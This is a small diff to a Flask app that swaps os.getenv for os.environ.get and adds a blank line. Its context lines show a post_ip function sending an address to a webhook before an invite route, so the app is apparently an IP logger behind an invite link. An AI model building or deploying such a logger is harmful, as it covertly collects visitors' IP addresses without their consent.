@@ -10,8 +10,8 @@ from flask import Flask, request, redirect
 load_dotenv()
 
 app = Flask(__name__)
-INVITE_LINK = os.getenv('INVITE_LINK')
-WEBHOOK_LINK = os.getenv('WEBHOOK_LINK')
+INVITE_LINK = os.environ.get('INVITE_LINK')
+WEBHOOK_LINK = os.environ.get('WEBHOOK_LINK')
 
 
 def post_ip(ip_addr):
@@ -33,6 +33,7 @@ def post_ip(ip_addr):
         requests.post(WEBHOOK_LINK, json={'embeds': [embed]}, timeout=10)
     except Exception as e:
         print(e)
+
 
 @app.route('/')
 def invite():
